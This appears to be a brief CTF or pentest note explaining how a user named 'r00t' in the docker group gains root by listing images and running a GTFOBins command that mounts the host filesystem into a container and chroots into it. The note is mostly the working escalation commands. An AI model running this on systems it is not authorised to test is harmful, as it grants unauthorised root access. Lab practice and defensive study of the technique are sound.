The user `r00t` is part of docker group, this can be leveraged to escalate our privileges
![[Pasted image 20240822165636.png]]

- list docker images
```bash
docker image ls 
```
![[Pasted image 20240822165715.png]]
- refer to GTFObins for shell access
```bash
docker run -v /:/mnt --rm -it *bash* chroot /mnt sh
```
use the image name in command (here: `bash`)
- get root
![[Pasted image 20240822165809.png]]

